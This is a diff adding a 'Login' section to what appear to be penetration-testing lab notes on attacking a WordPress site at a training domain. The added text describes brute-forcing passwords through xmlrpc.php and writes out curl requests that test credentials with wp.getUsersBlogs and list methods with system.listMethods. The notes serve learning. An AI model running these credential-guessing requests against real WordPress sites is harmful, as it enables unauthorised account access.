@@ -220,3 +220,27 @@ curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
 
 ![](Images/Pasted%20image%2020240311185532.png)
 
+## Login 
+
+with a valid list of users we can then use a password brute forcing attack to attempt to gain access to the wordpress backend   
+the attack can be performed via the login page or the `xmlrpc.php` page   
+
+```shell
+curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+```
+
+if our request contains valid credentials we would see something like: 
+
+![](Images/Pasted%20image%2020240312161316.png)
+
+if not we would see a 403 forbidden: 
+
+![](Images/Pasted%20image%2020240312161344.png)
+
+we can see how many method calls we can use on our target by using the `system.listMethods` method: 
+
+`curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php`
+
+![](Images/Pasted%20image%2020240312161825.png)
+
+
